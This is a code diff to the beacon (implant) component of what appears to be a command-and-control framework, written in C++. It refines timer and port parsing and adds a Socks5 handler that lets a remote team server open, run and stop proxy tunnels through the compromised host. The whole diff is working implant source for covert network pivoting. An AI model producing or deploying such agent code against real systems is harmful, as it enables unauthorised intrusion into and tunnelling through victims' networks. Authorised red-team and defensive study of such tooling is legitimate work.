@@ -453,7 +453,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		
 		try 
 		{
-			m_aliveTimerMs = std::stoi(newSleepTimer)*1000;
+			m_aliveTimerMs = std::stof(newSleepTimer)*1000;
 		}
 		catch (const std::invalid_argument& ia) 
 		{
@@ -500,7 +500,17 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			else if(splitedCmd[1]=="tcp")
 			{
 				std::string localHost = splitedCmd[2];
-				int localPort = std::stoi(splitedCmd[3]);
+				int localPort;
+				try
+				{
+					localPort = std::stoi(splitedCmd[3]);
+				}
+				catch (const std::invalid_argument& ia) 
+				{
+					std::string msg = "Error port format";
+					c2RetMessage.set_cmd("");
+					c2RetMessage.set_returnvalue(msg);
+				}
 
 				std::vector<unique_ptr<Listener>>::iterator object = 
 					find_if(m_listeners.begin(), m_listeners.end(),
@@ -540,7 +550,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			if(object!=m_listeners.end())
 			{
 				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
-				std::move(*object);
+				// std::move(*object);
 				msg = listenerHash;
 			}
 			else 
@@ -549,6 +559,110 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			c2RetMessage.set_cmd(cmd);
 			c2RetMessage.set_returnvalue(msg);
 		}
+	}
+	else if(instruction == Socks5)
+	{
+		SPDLOG_TRACE("Socks5 {} {} {}", c2Message.instruction(), c2Message.cmd(), c2Message.pid());
+
+		c2RetMessage.set_pid(c2Message.pid());
+
+		if(c2Message.cmd()=="init")
+		{
+			SPDLOG_DEBUG("Socks5 init {}: {}:{}", c2Message.pid(), c2Message.data(), c2Message.args());
+			std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());
+
+			try 
+			{
+				// TODO issu here ?
+				uint32_t ip_dst = std::stoi(c2Message.data());
+				uint16_t port = std::stoi(c2Message.args());
+			
+				int initResult = socksTunnelClient->init(ip_dst, port);
+				if(initResult)
+				{
+					m_socksTunnelClient.push_back(std::move(socksTunnelClient));
+				}
+				else
+				{
+					SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
+					// handle the fact that the ip/port is not reachable and send to the TeamServer to kill the tunnel
+					c2RetMessage.set_data("fail");
+					return false;
+				}
+			}
+			catch (const std::invalid_argument& ia) 
+			{
+				SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
+				c2RetMessage.set_data("fail");
+				return false;
+			}
+
+			SPDLOG_DEBUG("Socks5 init Finished");
+		}
+		else if(c2Message.cmd()=="run")
+		{
+			SPDLOG_DEBUG("Socks5 run {}", c2Message.pid());
+
+			for(int i=0; i<m_socksTunnelClient.size(); i++)
+        	{
+				SPDLOG_DEBUG("Socks5 run id with handle {}, id available {}", c2Message.pid(), m_socksTunnelClient[i]->getId());
+				if(m_socksTunnelClient[i]!=nullptr)
+				{
+					if(m_socksTunnelClient[i]->getId()==c2Message.pid())
+					{
+						SPDLOG_DEBUG("Socks5 run process {}", c2Message.pid());
+						SPDLOG_DEBUG("Socks5 run input {}", c2Message.data().size());
+
+						std::string dataOut;
+						int res = m_socksTunnelClient[i]->process(c2Message.data(), dataOut);
+
+						SPDLOG_DEBUG("Socks5 run output {}",  dataOut.size());
+
+						SPDLOG_DEBUG("Socks5 run process ok {}", c2Message.pid());
+
+						// if(res<=0 || dataOut.size()==0)
+						if(res<=0)
+						{
+							SPDLOG_DEBUG("Socks5 run stop {}", c2Message.pid());
+
+							m_socksTunnelClient[i].reset(nullptr);
+							c2RetMessage.set_cmd("stop");
+						}
+
+						SPDLOG_DEBUG("Socks5 run process finished {}", c2Message.pid());
+
+						c2RetMessage.set_data(dataOut);
+					}
+				}
+			}
+
+			SPDLOG_DEBUG("Socks5 run Finished");
+		}
+		else if(c2Message.cmd()=="stop")
+		{
+			SPDLOG_DEBUG("Socks5 stop {}", c2Message.pid());
+			for(int i=0; i<m_socksTunnelClient.size(); i++)
+        	{
+				if(m_socksTunnelClient[i]!=nullptr)
+				{
+					if(m_socksTunnelClient[i]->getId()==c2Message.pid())
+					{
+						m_socksTunnelClient[i].reset(nullptr);
+					}
+				}
+			}
+			SPDLOG_DEBUG("Socks5 stop Finished");
+		}
+
+		SPDLOG_DEBUG("Finishing");
+
+		// Remove ended tunnels
+		m_socksTunnelClient.erase(std::remove_if(m_socksTunnelClient.begin(), m_socksTunnelClient.end(),
+                             [](const std::unique_ptr<SocksTunnelClient>& ptr) { return ptr == nullptr; }),
+              m_socksTunnelClient.end());
+
+		SPDLOG_DEBUG("m_socksTunnelClient size {}", m_socksTunnelClient.size());
+		
 	}
 	else if(instruction == LoadC2Module)
 	{
